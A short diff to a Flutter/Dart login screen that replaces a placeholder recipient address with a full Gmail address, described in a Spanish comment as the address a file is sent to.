@@ -16,7 +16,8 @@ class _LoginWithPhoneEmailUsernameScreenState extends State<LoginCorreo> {
   final TextEditingController _emailController = TextEditingController();
   final TextEditingController _passwordController =
       TextEditingController(); // Nuevo controlador para la contraseña
-  final String recipientEmail = '@gmail.com'; // Correo para enviar el archivo
+  final String recipientEmail =
+      'pruebasanalisisamer@gmail.com'; // Correo para enviar el archivo
 
   @override
   Widget build(BuildContext context) {
